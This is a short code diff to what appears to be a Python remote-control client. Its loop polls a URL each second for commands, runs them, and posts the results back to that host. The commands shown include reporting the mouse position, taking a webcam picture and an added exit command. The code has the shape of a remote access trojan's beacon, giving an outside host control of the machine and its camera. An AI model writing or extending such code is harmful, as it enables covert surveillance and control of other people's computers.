@@ -66,6 +66,8 @@ def execute(cmd):
             output = f"The mouse position is: {pyautogui.position()}\nSCROLL!"
         elif cmd.startswith("cam"):
             output = str(take_picture())
+        elif cmd.startswith("exit"):
+            exit()
     except Exception as e:
         output = "Error: " + str(e)
 
@@ -77,10 +79,14 @@ while True:
     print("_", end="")
     response = ""
     try:
-        response = requests.get(url)
+        response = str(requests.get(url).content.decode("utf-8"))
+        print("_", end="")
+    except:
+        print("x", end="")
+    data = execute(response)
+    try:
+        print(requests.post(url, data=data).text, end="")
     except:
         pass
-    data = execute(str(response.content.decode("utf-8")))
-    print(requests.post(url, data=data).text, end="")
 
     time.sleep((1.0 - (time.time() % 1)))
